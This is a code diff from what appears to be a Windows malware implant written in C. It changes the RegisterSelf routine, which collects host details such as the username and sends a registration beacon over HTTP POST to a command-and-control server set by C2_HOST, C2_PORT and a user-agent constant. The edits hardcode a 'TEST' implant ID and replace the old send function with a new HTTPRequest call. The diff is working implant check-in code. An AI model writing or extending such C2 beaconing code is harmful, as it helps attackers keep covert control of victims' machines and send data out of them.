@@ -5,8 +5,8 @@
 
 #include <windows.h>
 
-#include "execute.h"
-
+#include "include/execute.h"
+#include "include/httpclient.h"
 #include "http_client.h"
 
 #include <stdio.h>
@@ -189,7 +189,9 @@ char *SetID() {
 int RegisterSelf() {
 	RegisterImplant ri = RegisterImplant_init_zero;
 
-	ri.ImplantID = SetID();
+	// ri.ImplantID = SetID();
+    ImplantID = (LPBYTE) "TEST";
+    ri.ImplantID = "TEST";
 	DEBUG_PRINTF("IMPLANT GUID = %s\n", ri.ImplantID);
 
 	DWORD usernameSize = MAX_PATH;
@@ -210,11 +212,22 @@ int RegisterSelf() {
 	BYTE *registerBuffer = EncodeRegisterImplant(&ri, &outboundBufferSize);
     DEBUG_PRINTF("outboundBufferSize = %llu\n", outboundBufferSize);
     DEBUG_PRINTF("outboundBuffer = %s\n", registerBuffer);
-	LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, outboundBufferSize, &inboundBufferSize);
+	//LPBYTE response = SendToServer(POST_VERB, REGISTER_PATH, registerBuffer, outboundBufferSize, &inboundBufferSize);
+    LPBYTE response = HTTPRequest(L"POST", C2_HOST, REGISTER_PATH, C2_PORT, C2_UA,
+                              registerBuffer, outboundBufferSize, &inboundBufferSize, USE_TLS);
+    if (response != NULL) {
+        DEBUG_PRINTF("Register Sent!\n");
+        free(response);
+        return TRUE;
+    }
+    /**
 	if (strcmp((const char *)response, (const char *)REGISTRATION_SUCCESSFUL)){
 		return 0;
         }
-	
+        */
+	if (response) {
+        free(response);
+    }
 	return 1;
 }
 
